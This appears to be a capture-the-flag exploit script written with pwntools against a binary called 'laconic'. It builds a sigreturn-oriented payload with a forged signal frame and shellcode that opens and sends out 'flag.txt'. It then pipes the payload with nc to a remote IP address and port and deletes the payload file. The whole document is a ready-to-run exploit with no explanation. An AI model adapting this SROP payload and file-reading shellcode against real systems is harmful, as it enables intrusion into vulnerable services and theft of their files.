from pwn import *
from os import popen

context.binary = binary = ELF('./laconic', checksec=False)

frame = SigreturnFrame()
frame.rip = 0x43015
frame.rsp = 0x43218
frame.rsi = 0x43206
frame.rax = 0
frame.rdx = 0x100

payload = p64(0)
payload += p64(0x43018)
payload += p64(15)
payload += p64(0x43015)
payload += bytes(frame)

shellcode = asm('''
	lea rdi, [rip+binsh]
	mov esi, 0
	mov eax, 2
	syscall

	mov rdi, 1
	mov rsi, rax
	mov rdx, 0
	mov r10, 256
	mov eax, 40
	syscall

	xor edi, edi
	mov eax, 60
	syscall

	binsh:
	.string "flag.txt"
		''')

with open('payload', 'wb') as f:
	f.write(payload)
	f.write(p64(0x43220)+shellcode)

print(popen('nc 94.237.60.20 50896 < payload').read())

os.system('rm payload')
